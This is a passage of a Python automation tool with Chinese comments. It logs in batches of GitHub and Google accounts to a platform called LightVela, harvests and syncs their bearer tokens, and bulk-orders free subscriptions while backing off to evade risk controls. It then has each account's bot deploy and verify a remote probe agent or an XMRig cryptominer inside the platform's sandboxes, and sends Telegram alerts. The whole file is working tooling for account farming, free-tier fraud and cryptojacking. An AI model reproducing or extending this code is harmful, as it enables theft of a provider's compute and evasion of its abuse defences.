      3) 任何异常全部吞掉，只把原因返回给调用方写日志。
    """
    cfg = load_tg_config()
    if not cfg.get("enabled", True):
        return False, "推送开关已关闭"
    token = (token or cfg.get("token") or "").strip()
    chat_id = (chat_id or cfg.get("chat_id") or "").strip()
    if not token or not chat_id:
        return False, "未配置机器人令牌或会话ID"
    url = "https://api.telegram.org/bot%s/sendMessage" % token
    body = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
            "disable_web_page_preview": "true"}
    last = ""
    tries = [(False, None)]
    if proxy_url:
        tries.append((True, proxy_url))
    for use_proxy, px in tries:
        s = requests.Session()
        s.trust_env = False
        if use_proxy:
            s.proxies = {"http": px, "https": px}
        try:
            r = s.post(url, data=body, timeout=15)
        except Exception as e:
            last = ("经代理" if use_proxy else "直连") + "异常：" + str(e)[:120]
            continue
        if r.status_code == 200:
            return True, "已发送" + ("（经代理）" if use_proxy else "（直连）")
        last = ("经代理" if use_proxy else "直连") + "HTTP %s %s" % (r.status_code, (r.text or "")[:120])
    return False, last or "发送失败"


def build_available_text(bundle, bundle_fallback, st_p, st_f,
                         accounts_n=0, auto_rush=False, seq=None, test=False):
    """生成「放货了」的推送文案。

    ★ 真实放货推送 与 面板上的测试推送 共用这一个函数，保证两条消息长得一模一样
      （老大要求：点测试就能看到真放货时的样子）。
    """
    lines = ["<b>🎯 LightVela 放货了</b>" + (("（第 %d 条）" % seq) if seq else "")]
    if st_p == "AVAILABLE":
        lines.append("✅ 主套餐 <b>%s</b>（4500 积分）现在可买" % bundle)
    if bundle_fallback and st_f == "AVAILABLE":
        lines.append("✅ 降级套餐 <b>%s</b>（100 积分）现在可买" % bundle_fallback)
    if st_p and st_p != "AVAILABLE":
        lines.append("· 主套餐 %s：%s" % (bundle, st_p))
    if bundle_fallback and st_f and st_f != "AVAILABLE":
        lines.append("· 降级套餐 %s：%s" % (bundle_fallback, st_f))
    lines.append("")
    lines.append("时间：%s" % time.strftime("%Y-%m-%d %H:%M:%S"))
    mid = center_machine_id()
    if mid:
        lines.append("机器：%s" % mid)
    if accounts_n:
        lines.append("待跑账号：%d 个" % accounts_n)
    lines.append("自动开抢：%s" % ("已开启" if auto_rush else "未开启（请自己点开始）"))
    if test:
        lines.append("")
        lines.append("<i>—— 以上是测试推送，真实放货时发的就是这条 ——</i>")
    return "\n".join(lines)


# ---------------- 任务 ----------------
class Job(object):
    def __init__(self, accounts, proxy, mode, interval=1.0, duration=300.0,
                 use_saved=False, bundle=DEFAULT_BUNDLE, bundle_fallback=None, parallel=1,
                 flow_rush=True, bot_prefix="agent", bot_retry=3, deploy_retry=3,
                 skip_verify=False, rush_limit=20):
        self.accounts = accounts
        self.proxy = proxy
        self.mode = mode if mode in MODES else "check"
        self.interval = float(interval or 1.0)
        self.duration = float(duration or 300.0)
        self.use_saved = bool(use_saved)
        self.bundle = bundle or DEFAULT_BUNDLE
        self.bundle_fallback = bundle_fallback    # 降级套餐（主套餐售罄时改订）
        self.parallel = max(1, int(parallel or 1))
        # ★ 2026-10-27 新增：每档套餐最多发多少单。主套餐发满就切降级套餐，
        #   降级套餐再发满就判失败（老大定的规则：4500 抢 20 次不成 → 切 100 → 再 20 次不成 → 失败）
        self.rush_limit = max(1, int(rush_limit or 20))
        # 监控批次专用开关
        self.abort_if_soldout = False   # 一旦售罄立即终止后续账号
        self.saved_fallback = True      # use_saved 但缺令牌时退回登录并保存令牌（而非失败）
        self.soldout_flag = False       # 批次内售罄标记（一旦置位，后续账号跳过）
        # 全流程参数
        self.flow_rush = bool(flow_rush)
        self.bot_prefix = (bot_prefix or "agent").strip() or "agent"
        self.bot_retry = max(1, int(bot_retry or 1))
        self.deploy_retry = max(1, int(deploy_retry or 1))
        self.skip_verify = bool(skip_verify)
        self.lock = threading.Lock()
        self.logs = []
        self.rows = []
        for a in accounts:
            self.rows.append({
                "idx": a["idx"],
                "login": a.get("login") or a.get("email") or ("#%d" % a["idx"]),
                "stage": "待处理" if a["ok"] else "格式错误",
                "detail": a.get("err", ""),
                "ok": False,
                "result": "",
            })
        self.stop_flag = False
        self.done = False
        self.tokens = {}
        self.started_at = 0.0
        self.finished_at = 0.0
        self.summary = ""

    # --- 上报 ---
    def _log_file(self):
        """日志文件句柄（懒加载，只尝试一次）。
        ★ 2026-10-27 新增：原来日志只存内存 self.logs，容器一重启全丢、出问题没法复盘。
        现在同时按天写 /data/lv-run-YYYYMMDD.log；任何异常都不影响主流程。"""
        if getattr(self, "_log_tried", False):
            return getattr(self, "_log_fh", None)
        self._log_tried = True
        self._log_fh = None
        try:
            d = os.environ.get("LV_DATA_DIR") or app_dir()
            p = os.path.join(d, "lv-run-%s.log" % time.strftime("%Y%m%d"))
            self._log_fh = open(p, "a", encoding="utf-8")
            self._log_path = p
        except Exception:
            self._log_fh = None
            self._log_path = ""
        return self._log_fh

    def log(self, msg):
        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
        with self.lock:
            self.logs.append(line)
            if len(self.logs) > 4000:
                del self.logs[:1500]
            fp = self._log_file()
            if fp is not None:
                try:
                    fp.write(line + "\n")
                    fp.flush()
                except Exception:
                    pass

    def row(self, idx, **kw):
        with self.lock:
            for r in self.rows:
                if r["idx"] == idx:
                    r.update(kw)
                    return

    def snapshot(self):
        with self.lock:
            return {"logs": list(self.logs), "rows": [dict(r) for r in self.rows],
                    "done": self.done, "summary": self.summary}

    def stop(self):
        self.stop_flag = True
        self.log("⏹ 收到停止指令，正在收尾 ...")

    def _stopped(self):
        return self.stop_flag

    def _mark_soldout_skip(self, idx):
        """监控批次：标记售罄跳过 + 终止后续账号（置 soldout_flag 并停任务）。"""
        with self.lock:
            self.soldout_flag = True
        try:
            self.stop()
        except Exception:
            pass
        self.row(idx, stage="售罄跳过", detail="放开后又售罄，已自动终止", ok=False, result="soldout_skip")
        self.log("[%d] 🛑 售罄：已终止后续账号并标记跳过" % idx)

    # --- 单账号：正常登录并保存令牌（复用模式缺令牌时的退回路径，也是普通登录路径） ---
    def _do_login(self, idx, tag, acc, px, name):
        """执行一次正常登录：成功后写入 self.tokens[name] 并返回 token。
        登录失败（密码/2FA/拒登/连续连接失败）直接抛异常，由 run_one 的 try 兜底判账号失败。
        token 会在任务结束时经 run() 的 finally → save_tokens() 自动落盘。"""
        self.row(idx, stage="登录中", detail="")
        self.log(tag + " 开始登录 ...")
        t0 = time.time()
        if acc.get("provider") == "google":
            token = google_login_retry(acc["email"], acc["password"], acc.get("recovery", ""), px,
                                       log=lambda m: self.log(tag + m))
        else:
            token = gh_login_retry(acc["login"], acc["password"], acc["tfa"], px,
                                   log=lambda m: self.log(tag + m))
        self.tokens[name] = token
        # ★ 同步到数据中心（跨机复用；失败不影响本次）
        if center_push_token(name, token):
            self.log(tag + " ☁ 令牌已同步到数据中心")
        else:
            self.log(tag + " ⚠ 数据中心同步失败（本地已存，不影响本次）")
        self.log(tag + " ✅ 登录成功（%.1fs）Bearer=%s…" % (time.time() - t0, token[:12]))
        self.row(idx, stage="已登录", detail="Bearer " + token[:12] + "…")
        return token

    # --- 单账号 ---
    def run_one(self, acc):
        idx = acc["idx"]
        name = acc.get("login") or acc.get("email") or ("#%d" % idx)
        tag = "[%d] %s" % (idx, name)
        px = proxy_of(acc, self.proxy)
        try:
            if not acc["ok"]:
                self.row(idx, stage="格式错误", detail=acc.get("err", ""), ok=False)
                self.log(tag + " 跳过：" + acc.get("err", ""))
                return
            # 监控批次：前面账号已确认售罄 → 后续账号直接跳过，不再浪费请求
            if self.soldout_flag or self._stopped():
                self.row(idx, stage="售罄跳过", detail="已终止（售罄/停止）", ok=False, result="soldout_skip")
                self.log(tag + " ⏭ 售罄/已停止，跳过")
                return
            token = ""
            if self.use_saved:
                token = self.tokens.get(name) or self.tokens.get(acc.get("email", "")) or ""
                if token:
                    self.log(tag + " 复用已存令牌，跳过登录")
                else:
                    # ★ 本地没有 → 问数据中心（查全量，不分机器，可跨机复用）
                    token = center_get_token(name) or ""
                    if token:
                        self.tokens[name] = token
                        self.log(tag + " ☁ 从数据中心取到令牌，跳过登录")
                    elif self.saved_fallback:
                        # 复用模式但本地和数据中心都没有 → 退回正常登录并保存（当新号走）
                        self.log(tag + " 本地/数据中心都没有令牌，退回登录并保存 ...")
                        token = self._do_login(idx, tag, acc, px, name)
                    else:
                        self.row(idx, stage="失败", detail="无已存令牌", ok=False)
                        self.log(tag + " ❌ 本地和数据中心都没有令牌（请先跑一次预登录）")
                        return
            else:
                token = self._do_login(idx, tag, acc, px, name)

            s = api_session(token, px)
            self.row(idx, stage="查订阅", detail="")
            state, have = probe_token(s)
            if state == "dead":
                # ★ 显式令牌检查：401/403 直接判失败，让老大导出失败账号重跑
                self.log(tag + " ❌ 令牌已失效（401/403）——请去掉「复用已存令牌」重新跑一次预登录")
                self.row(idx, stage="失败", detail="令牌已失效，需重新登录", ok=False,
                         result="token_dead")
                return
            if state == "unknown":
                self.log(tag + " ⚠ 查订阅没成功（网络抖动？），按'无订阅'继续尝试")
            has_pass = bool(have)
            if has_pass:
                pid = have[0].get("pass_id", "")
                bid = have[0].get("bundle_id", "")
                self.log(tag + " ⭐ 已有订阅：%s %s" % (bid, pid))
                self.row(idx, stage="已订阅", detail="%s %s" % (bid, pid), ok=True, result="already")
                if self.mode != "fullflow":
                    return
            else:
                if self.mode == "check":
                    self.log(tag + " 体检：无订阅（未下单）")
                    self.row(idx, stage="无订阅", detail="体检未下单", ok=False, result="no_pass")
                    return
                if self.mode == "prelogin":
                    self.log(tag + " 预登录完成，令牌已存")
                    self.row(idx, stage="已存令牌", detail="Bearer " + token[:12] + "…", ok=True, result="prelogin")
                    return

            # ---- 抢单（rush 模式；或全流程里勾了「先抢订阅」）----
            if self.mode == "rush" or (self.mode == "fullflow" and self.flow_rush):
                if not self._rush(idx, tag, s, has_pass, token):
                    return
            elif self.mode == "fullflow" and not has_pass:
                self.row(idx, stage="失败", detail="没有订阅且未开启抢单", ok=False, result="no_pass")
                self.log(tag + " ❌ 没有 0 元订阅；全流程需要先有订阅（可勾选「先抢订阅」）")
                return

            # ---- 全流程后续：建Bot → 设主模型 → 部署 → 核实 ----
            if self.mode == "fullflow":
                self._deploy_flow(idx, tag, token, px)
        except Exception as e:
            self.log(tag + " ❌ 失败：%s" % e)
            detail = str(e)[:160]
            result = "error"
            if "registration_email_risk_re" in detail:
                # 谷歌对这批邮箱标记了风险，纯风控，需换号源 / 换更干净邮箱域 / 换环境
                result = "google_risk"
                self.log(tag + " 🚫 谷歌风控标记（registration_email_risk_re）——非程序问题，需换号源或换更干净邮箱域")
            self.row(idx, stage="失败", detail=detail, ok=False, result=result)

    # --- 订阅策略辅助：主套餐 + 降级套餐 ---
    def _stage_bundle(self, stage):
        """按档位取套餐 ID：0=主套餐，1=降级套餐（没配降级套餐时恒为主套餐）。"""
        if stage == 1 and self.bundle_fallback:
            return self.bundle_fallback
        return self.bundle

    def _has_next_stage(self, stage):
        """当前档位还有没有下一档可切。"""
        return bool(self.bundle_fallback) and stage == 0

    def _primary_unavailable(self, token=None):
        """主套餐是否真的不可买：主套餐售罄，且无降级套餐可用（或降级也售罄）。
        有降级套餐且降级可买时返回 False（应继续走降级，不应整批跳过）。

        ★ 2026-10-27 修复：查询必须带令牌，否则平台回 401、状态恒为空、本函数恒为 False。"""
        if bundle_state(self.proxy, self.bundle, token) != "SOLD_OUT":
            return False
        if not self.bundle_fallback:
            return True
        return bundle_state(self.proxy, self.bundle_fallback, token) == "SOLD_OUT"

    def _attempt_order(self, s, tag, stage=0):
        """按档位下单（降级不再靠查状态判断，纯按"发满多少单"切换，更可靠）。
        返回 (st, code, msg, used_bundle)。"""
        used = self._stage_bundle(stage)
        st, code, msg = order(s, used)
        return st, code, msg, used

    def _rush(self, idx, tag, s, has_pass, token=None):
        """抢 0 元订阅。已有订阅直接算成功。返回 True = 有订阅可用。

        ★ 2026-10-27 改造（老大定的规则）：
          主套餐连发 20 次抢不到 → 自动切降级套餐 → 降级套餐再发 20 次抢不到 → 判失败。
          · 次数口径：只有「真正没抢到」才计次 —— 下单被拒（售罄/无货）、或下单成功但
            等不到订阅生效，都算一次。
          · 「平台影子计费账户还没开通」(409) 和「影子账户绑定待开通」(403) 这两类
            **临时性错误不计次**：抓包实测首次下单到成功要约 178 秒、连点 16 次才成，
            若计次会在账户还没开好时就误切降级套餐，反而更慢。
          · 时间预算保留作安全网：每档各自一套 300 秒 / 影子账户 600 秒预算，切档时重置。

        ★ 下单策略仍是两阶段（沿用老逻辑，别改回去）：
            A. 发一单（200=已下单/待生效；非200=没抢到，隔 interval 再试；401=凭证死）
            B. 下单成功后只轮询 live_passes 不重发，递增等待(2s→…→8s)最多 PATIENCE 秒，
               生效即成功；超窗口仍未生效才回 A 重发下一单。
        """
        PATIENCE = 15.0
        # ★ 新账号「影子计费账户开通」专用参数（抓包实测：首次下单到成功约 178 秒，
        #   期间平台持续回 409 PASS_BILLING_ACCOUNT_OPEN_FAILED，真人手动点也是连点 16 次才成）
        SHADOW_CODE = "PASS_BILLING_ACCOUNT_OPEN_FAILED"
        SHADOW_BACKOFF = 4.0     # 这类 409 的退避秒数（不再 1 秒猛发，省请求也躲风控）
        SHADOW_BUDGET = 600.0    # 这类 409 的专用总预算秒数
        SHADOW_BINDING_MAX = 5        # 影子账户绑定 403 最多退避重试次数（绑定按会话首次自动开通，几秒即成）
        SHADOW_BINDING_BACKOFF = 15.0  # 每次重试前退避秒数（给平台自动开通留时间）
        LIMIT = max(1, int(getattr(self, "rush_limit", 20) or 20))   # 每档最多发多少单
        if has_pass:
            return True
        # 监控批次：开抢前先确认还有货，没货立即终止后续账号（避免空耗请求）
        if self.abort_if_soldout:
            if self._primary_unavailable(token):
                self.log(tag + " 🛑 放开后又售罄，终止本账号")
                self._mark_soldout_skip(idx)
                return False
        self.row(idx, stage="抢单中", detail="")
        self.log(tag + " 开始抢单（每档最多 %d 发；间隔 %ss；影子账户专用最长 %ss）..."
                 % (LIMIT, self.interval, SHADOW_BUDGET))
        if self.bundle_fallback:
            self.log(tag + " 订阅策略：优先 %s，发满 %d 发未成自动改抢 %s，再发满 %d 发未成判失败"
                     % (self.bundle, LIMIT, self.bundle_fallback, LIMIT))
        stage = 0            # 0=主套餐，1=降级套餐
        used_n = 0           # 当前档已"真正没抢到"的次数
        n = 0                # 总发单次数（含临时错误，仅用于日志）
        self._shadow_bind_retry = 0   # 影子账户绑定 403 重试计数（每次抢单重置）
        deadline = time.time() + self.duration
        # ★ 影子计费账户开通专用预算：只有在全程【只】出现 409 影子账户这一类错误时才生效。
        #   一旦出现售罄/401/网络异常等其它错误，立刻退回原 duration，避免真失败时空转。
        shadow_deadline = time.time() + max(self.duration, SHADOW_BUDGET)
        only_shadow = True

        def _next_stage(reason):
            """切到降级套餐；没有降级套餐可切时返回 False。"""
            nonlocal stage, used_n, deadline, shadow_deadline, only_shadow
            if not self._has_next_stage(stage):
                return False
            done = used_n
            stage = 1
            used_n = 0
            only_shadow = True
            self._shadow_bind_retry = 0   # 换套餐后重新给满绑定重试次数
            deadline = time.time() + self.duration
            shadow_deadline = time.time() + max(self.duration, SHADOW_BUDGET)
            self.log(tag + " 🔄 %s：主套餐 %s 已发 %d 发未成 → 自动改抢降级套餐 %s"
                     % (reason, self.bundle, done, self._stage_bundle(1)))
            self.row(idx, stage="抢单中", detail="改抢降级套餐 %s" % self._stage_bundle(1))
            return True

        def _give_up():
            self.log(tag + " ❌ 已发 %d 发（含降级套餐）仍未抢到，判定失败" % n)
            self.row(idx, stage="失败", detail="已发 %d 发未抢到（含降级套餐）" % n,
                     ok=False, result="rush_failed")
            return False

        while True:
            if self._stopped():
                break
            if time.time() >= (shadow_deadline if only_shadow else deadline):
                if _next_stage("本档时间用完"):
                    continue
                break
            # ---- A. 发一单（按当前档位）----
            n += 1
            try:
                st, code, msg, used = self._attempt_order(s, tag, stage)
            except Exception as e:
                only_shadow = False   # 网络异常不算「只是影子账户没开好」，退回原预算
                if n == 1 or n % 10 == 0:
                    self.log(tag + " 第 %d 发网络异常，稍后重试：%s" % (n, str(e)[:60]))
                time.sleep(self.interval)
                continue
            if st == 401:
                self.log(tag + " ❌ 凭证失效(401)")
                self.row(idx, stage="失败", detail="凭证失效(401)", ok=False, result="error")
                return False

            # ---- 临时性错误（不计次）----
            if not (200 <= st < 300) and code == SHADOW_CODE:
                # 平台侧影子计费账户还没开好 → 退避久一点再试，别 1 秒猛发
                back = SHADOW_BACKOFF + random.uniform(0, 1.5)
                if n == 1 or n % 5 == 0:
                    self.log(tag + " 第 %d 发影子计费账户未就绪（409），%.1fs 后再试（不计次）" % (n, back))
                self.row(idx, stage="抢单中", detail="影子账户开通中｜已发 %d 次" % n)
                time.sleep(back)
                continue
            if not (200 <= st < 300) and "SHADOW_BINDING" in str(code or ""):
                # 403 PASS_SHADOW_BINDING_REQUIRED：绑定按【登录会话首次自动开通】（仅数秒），
                # 复用同一令牌再跑一次即过 —— 故不立即判死，退避重试等平台自动开通。
                if self._shadow_bind_retry >= SHADOW_BINDING_MAX:
                    self.log(tag + " ❌ 影子账户已重试 %d 次仍提示需绑定（%s）——可能真未开通"
                             % (self._shadow_bind_retry, code or msg))
                    self.row(idx, stage="失败", detail="影子账户重试超限", ok=False,
                             result="shadow_binding_required")
                    return False
                self._shadow_bind_retry += 1
                back = SHADOW_BINDING_BACKOFF + random.uniform(0, 5.0)
                self.log(tag + " ⚠️ 首次下单触发影子账户绑定（%s），平台自动开通中，第 %d/%d 次，%.1fs 后重试（不计次）"
                         % (code or msg, self._shadow_bind_retry, SHADOW_BINDING_MAX, back))
                self.row(idx, stage="抢单中",
                         detail="影子账户自动开通中(%d/%d)" % (self._shadow_bind_retry, SHADOW_BINDING_MAX))
                time.sleep(back)
                continue

            # ---- 真正没抢到：计一次 ----
            if not (200 <= st < 300):
                if code == "PASS_ALREADY_EXISTS":
                    # 歧义态：可能上一轮已抢到 → 复查一次 live_passes
                    live = live_passes(s)
                    if live:
                        pid = live[0].get("pass_id", "")
                        bid = live[0].get("bundle_id", "")
                        self.log(tag + " 🎉 复查发现已抢到（409 已存在）| %s | pass=%s" % (bid, pid))
                        self.row(idx, stage="已抢到", detail="%s %s" % (bid, pid), ok=True, result="already")
                        return True
                    self.log(tag + " ❌ pass 已存在但查不到（状态冲突），停止重试")
                    self.row(idx, stage="失败", detail="pass已存在但查不到", ok=False,
                             result="pass_exists_conflict")
                    return False
                only_shadow = False   # 其它错误 → 退回原预算
                used_n += 1
                if used_n == 1 or used_n % 5 == 0 or used_n >= LIMIT:
                    self.log(tag + " 第 %d 发未中（本档 %d/%d）：%s %s"
                             % (n, used_n, LIMIT, st, code or msg))
                self.row(idx, stage="抢单中",
                         detail="%s 已发 %d/%d｜%s" % (used, used_n, LIMIT, code or msg))
                if used_n >= LIMIT:
                    if _next_stage("本档发满 %d 发" % LIMIT):
                        continue
                    return _give_up()
                time.sleep(self.interval)
                continue

            # ---- B. 下单成功 → 耐心等生效（只轮询，不重发订单）----
            self.log(tag + " 第 %d 发下单成功（%s），等待生效 ..." % (n, used))
            self.row(idx, stage="抢单中", detail="第 %d 发已下单，等待生效" % n)
            waited = 0.0
            step = 2.0
            while waited < PATIENCE and time.time() < (shadow_deadline if only_shadow else deadline) and not self._stopped():
                time.sleep(step)
                waited += step
                live = live_passes(s)
                if live:
                    pid = live[0].get("pass_id", "")
                    bid = live[0].get("bundle_id", "")
                    self.log(tag + " 🎉 抢到！第 %d 发 | %s | pass=%s（等待 %.1fs 生效）"
                             % (n, bid, pid, waited))
                    self.row(idx, stage="已抢到", detail="%s %s" % (bid, pid), ok=True, result="grabbed")
                    return True
                step = min(step + 1.0, 8.0)
            if self._stopped():
                break
            if time.time() >= (shadow_deadline if only_shadow else deadline):
                if _next_stage("本档时间用完"):
                    continue
                break
            # 耐心窗口耗尽仍未生效 → 这一单没成，计一次
            used_n += 1
            self.log(tag + " 第 %d 发等待 %.0fs 仍未生效（本档 %d/%d），重发下一单 ..."
                     % (n, waited, used_n, LIMIT))
            if used_n >= LIMIT:
                if _next_stage("本档发满 %d 发" % LIMIT):
                    continue
                return _give_up()
            time.sleep(self.interval)
        if self._stopped():
            self.row(idx, stage="已停止", detail="用户停止", ok=False, result="stopped")
            self.log(tag + " 已停止（共 %d 发）" % n)
        else:
            self.row(idx, stage="超时未抢到", detail="共 %d 发" % n, ok=False, result="timeout")
            self.log(tag + " ⏰ 超时未抢到（共 %d 发）" % n)
        return False

    # ---- 全流程：建Bot → 部署 → 核实（复用已跑通的 Node 引擎）----
    def _deploy_flow(self, idx, tag, token, px):
        js = find_purecode()
        if not js:
            self.row(idx, stage="失败", detail="缺少 " + PURECODE_JS, ok=False, result="error")
            self.log(tag + " ❌ 找不到 %s（需与本程序同目录）" % PURECODE_JS)
            return
        if not find_node():
            self.row(idx, stage="失败", detail="缺少 Node 环境", ok=False, result="error")
            self.log(tag + " ❌ 找不到 node.exe，无法执行建Bot/部署/核实")
            return

        cred = {"LIGHTVELA_BEARER": token, "LIGHTVELA_NO_AUTOCLOSE": "1"}
        if px:
            cred["LIGHTVELA_EGRESS_PROXY"] = json.dumps(proxy_to_json(px), ensure_ascii=False)

        # ① 建 Bot（Node 侧有现成实例会自动复用）
        self.row(idx, stage="建Bot中", detail="")
        self.log(tag + " 开始创建机器人 ...")
        name = DEFAULT_BOT_NAME   # ★ 统一用网站系统默认名（不再用 前缀-序号，也不随机）
        bot = ""
        for attempt in range(1, self.bot_retry + 1):
            if self._stopped():
                break
            try:
                _, out = run_node(js, ["--create-bot", "--name", name], cred, timeout=300)
            except Exception as e:
                out = "ERR " + str(e)
            m = re.search(r"BOT=([A-Za-z0-9_-]+)\|status=([a-zA-Z]*)", out)
            if m and m.group(1):
                bot = m.group(1)
                self.log(tag + " ✅ 建Bot成功：实例=%s 状态=%s" % (bot, m.group(2) or "?"))
                break
            self.log(tag + " 建Bot第 %d/%d 次未成功：%s" % (attempt, self.bot_retry, tail(out, 160)))
            time.sleep(2)
        if not bot:
            self.row(idx, stage="失败", detail="建Bot失败", ok=False, result="error")
            return
        self.row(idx, stage="建Bot完成", detail="实例 " + bot)

        # ② 部署（发命令，成功判据 = 回复里含"部署完成，探针服务运行正常"）
        dep = dict(cred)
        dep["LIGHTVELA_INSTANCE_ID"] = bot
        dep["LIGHTVELA_BOT_ID"] = bot
        self.row(idx, stage="部署中", detail="")
        self.log(tag + " 发送部署指令（单次最长等 20 分钟）...")
        ok = False
        for attempt in range(1, self.deploy_retry + 1):
            if self._stopped():
                break
            try:
                _, out = run_node(js, ["--message", deploy_msg()], dep, timeout=1260)
            except subprocess.TimeoutExpired:
                out = "ERR 部署超时（20 分钟）"
            except Exception as e:
                out = "ERR " + str(e)
            if "RESULT=OK|" in out:
                ok = True
                self.log(tag + " ✅ 部署成功（第 %d 次）" % attempt)
                break
            self.log(tag + " 部署第 %d/%d 次未成功：%s" % (attempt, self.deploy_retry, tail(out, 160)))
            time.sleep(3)
        if not ok:
            self.row(idx, stage="失败", detail="部署失败", ok=False, result="error")
            return
        self.row(idx, stage="已部署", detail="实例 " + bot)

        # ③ 核实（独立连沙箱 shell，不看机器人自己怎么说）
        if self.skip_verify:
            self.log(tag + " ⏭ 已按设置跳过「独立核实」（以部署步 RESULT=OK 判成功）")
            self.row(idx, stage="✅ 完成", detail="部署成功（未二次核实）实例 " + bot, ok=True, result="done")
            return
        self.row(idx, stage="核实中", detail="")
        verified, uuid = False, ""
        is_mining = bool(_MINING_KW.search(deploy_msg()))
        for attempt in range(1, 4):
            if self._stopped():
                break
            time.sleep(2 if attempt == 1 else 5)
            if is_mining:
                # 挖矿部署·通用核实：脚本结束信号(LV_DONE@host)后 → 等10s首查(探针) → 等20s复查；仅复查裁决
                try:
                    _, out = run_node(js, ["--shell", XMRIG_VERIFY_CMD, "--shell-wait", "38000"], dep, timeout=200)
                except Exception as e:
                    out = "ERR " + str(e)
                v_first = bool(re.search(r"FIRST=\d", out))
                v_xmrig = bool(re.search(r"SECOND=\d", out))   # 唯一裁决：复查有进程才算成功
                verified = v_xmrig
                self.log(tag + " 核实第 %d 次[挖矿]：首查=%s 复查=%s → %s"
                         % (attempt, v_first, v_xmrig, "在线 ✓" if verified else "未通过"))
                if verified:
                    break
                continue
            # 原有探针核实逻辑（保持不变）
            try:
                _, out = run_node(js, ["--shell", VERIFY_CMD, "--shell-wait", "15000"], dep, timeout=180)
            except Exception as e:
                out = "ERR " + str(e)
            v_active = bool(re.search(r"(^|\n)active\s*($|\n)", out))
            v_proc = "yufu-agent" in out
            v_estab = bool(re.search(r"ESTAB[\s\S]{0,120}19527", out))
            mu = re.search(r"\n([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", out)
            uuid = mu.group(1) if mu else ""
            verified = v_estab and (v_active or v_proc)
            self.log(tag + " 核实第 %d 次：服务=%s 进程=%s 连面板=%s uuid=%s → %s"
                     % (attempt, v_active, v_proc, v_estab, uuid or "?", "在线 ✓" if verified else "未通过"))
            if verified:
                break
        if verified:
            self.row(idx, stage="✅ 完成", detail="已核实在线 uuid=" + (uuid or "?"), ok=True, result="done")
            self.log(tag + " 🏁 全流程完成：实例 %s 探针在线" % bot)
        else:
            self.row(idx, stage="失败", detail="部署完成但未核实到在线", ok=False, result="error")

    def run(self):
        self.started_at = time.time()
        self.log("===== 开始 | 账号 %d 个 | 模式 %s | 代理 %s ====="
                 % (len(self.accounts), MODE_LABEL.get(self.mode, self.mode), self.proxy or "（直连）"))
        if getattr(self, "_log_path", ""):
            self.log("本次日志文件: %s" % self._log_path)
        try:
            if self.parallel > 1 and len(self.accounts) > 1:
                from concurrent.futures import ThreadPoolExecutor
                with ThreadPoolExecutor(max_workers=self.parallel) as ex:
                    list(ex.map(self.run_one, self.accounts))
            else:
                for a in self.accounts:
                    if self._stopped():
                        break
                    self.run_one(a)
        except Exception as e:
            self.log("任务异常：%s" % e)
        finally:
            self.save_tokens()
            ok = sum(1 for r in self.rows if r["ok"])
            self.summary = "完成：%d/%d 成功（耗时 %.0fs）" % (ok, len(self.rows), time.time() - self.started_at)
            self.done = True
            self.log("===== " + self.summary + " =====")
            # 关掉日志文件句柄（webapp 是常驻进程，不关会累积）
            try:
                if getattr(self, "_log_fh", None) is not None:
                    self._log_fh.close()
                    self._log_fh = None
                    self._log_tried = False
            except Exception:
                pass

    def save_tokens(self):
        try:
            if not self.tokens:
                return
            p = token_path()
            old = {}
            if os.path.isfile(p):
                try:
                    raw = json.load(open(p, encoding="utf-8"))
                    old = raw if isinstance(raw, dict) else {}
                except Exception:
                    old = {}
            now = int(time.time())
            for k, v in self.tokens.items():
                if k and v:
                    old[k] = {"token": v, "ts": now}
            write_tokens(old)
            self.log("令牌已存：%s（共 %d 条）" % (p, len(old)))
        except Exception as e:
            self.log("存令牌失败：%s" % e)

    # --- 导出 ---
    def export_text(self, which):
        sel = {"all": lambda r: True,
               "ok": lambda r: r["ok"],
               "fail": lambda r: not r["ok"]}[which]
        lines = []
        for a in self.accounts:
            row = next((r for r in self.rows if r["idx"] == a["idx"]), None)
            if row is None or not sel(row):
                continue
            lines.append(to_line(a))
        return lines


# ---------------- 放货监控 ----------------
class Monitor(object):
    """后台监控线程：启动检测首号 → 轮询 bundles 状态 → 放货触发并发批次。

    流程严格按需求：
      1) 拿导入列表【第一个账号】做 GitHub 授权登录 + 凭证检测（确认流程可用才继续）；
      2) 通过后用 interval 秒轮询 GET /v1/bundles，盯 bundle_launch_ai_01 的
         bundle_sales_state 从 SOLD_OUT 翻 AVAILABLE；
      3) 一放货，按并发数对【全部导入账号】（含第一个）并发跑 注册→存凭证→买 0 元；
      4) 批量中一旦再售罄，立即停剩余账号并打"售罄跳过"标记。
    """

    def __init__(self, accounts, proxy, interval_sec, parallel, api,
                 bundle=DEFAULT_BUNDLE, bundle_fallback=None,
                 auto_rush=False, tg_enabled=True, use_saved=False):
        self.accounts = accounts
        self.proxy = proxy
        self.interval = max(1, int(interval_sec or 5))
        self.parallel = max(1, int(parallel or 1))
        self.api = api                      # 引用 Api，便于把批次挂到 api.job 供 UI 显示
        self.bundle = bundle                # 主套餐
        self.bundle_fallback = bundle_fallback    # 降级套餐（主套餐售罄时改订）
        # ★ 2026-10-27 新增：发现可买时是否自动开抢。老大选「只推 TG，不自动开抢」
        self.auto_rush = bool(auto_rush)
        # ★ 2026-10-27 新增：复用已存令牌（老大要求：监控首号检测 + 监控触发的批量都要生效）
        #   勾了就先去本地令牌库/数据中心找，找到且没失效就直接用，不重复登录。
        self.use_saved = bool(use_saved)
        self.local_tokens = {}              # 本次监控里已知可用的令牌（首号拿到后直接喂给批次）
        self.first_token_name = ""          # 首号在令牌库里的键名
        self.tg_enabled = bool(tg_enabled)  # 是否发 TG 推送
        self.tg_state = None                # 最近一次已知状态（AVAILABLE / SOLD_OUT）
        self.tg_last_result = ""            # 最近一次推送结果（UI 上显示）
        # ★ 2026-10-27 改：可买就每 5 秒推一次，直到点「停止推送」
        self.push_interval = 5.0            # 推送间隔（秒）
        self.push_stopped = False           # 老大点了「停止推送」→ 只停推送，不停监控
        self.last_push_at = 0.0             # 上次推送时刻
        self.push_count = 0                 # 本轮已推多少条
        self.last_avail = None              # (st_p, st_f)：最近一次确认可买的状态；None=当前不可买
        self.lock = threading.Lock()
        self.logs = []
        self.stop_flag = False
        self.done = False
        self.phase = "idle"                 # idle→detect→polling→rushing→done
        self.last_state = None
        self.last_check = 0.0
        self.summary = ""
        self.first_token = ""

    # --- 推送 ---
    def _notify(self, text):
        """发一条 TG 推送。未配置/失败都只写日志，绝不影响监控主流程。"""
        if not self.tg_enabled:
            return False
